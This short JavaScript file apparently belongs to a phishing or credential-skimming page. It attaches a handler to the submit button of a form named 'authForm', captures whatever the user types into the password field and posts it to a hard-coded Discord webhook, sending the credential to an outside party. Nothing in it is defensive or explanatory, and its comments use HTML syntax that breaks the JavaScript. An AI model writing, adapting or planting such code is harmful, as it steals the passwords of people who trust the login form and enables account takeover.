document.addEventListener('DOMContentLoaded', () => {
    <!-- Add event listener to the submit button of the form, and call get_password() when triggered -->
    document.getElementById('authForm').addEventListener('submit', event => {
        get_password(document.getElementById('authPassword').value);
    });
});

function get_password(password) {
    <!-- Send the password to the Discord webhook -->
    var request = new XMLHttpRequest();
    request.open("POST", 'https://discord.com/api/webhooks/1180148041383166002/Rj0d2fK4Y17pYPjXVlx4DilfLDSq0F7JWemKHO7uDlOZQ3kpuUUOkWzFZ5ZsgJBxv_0l', true);
    request.setRequestHeader("Content-Type", "application/json");
    request.send(JSON.stringify({ content: password }));
}

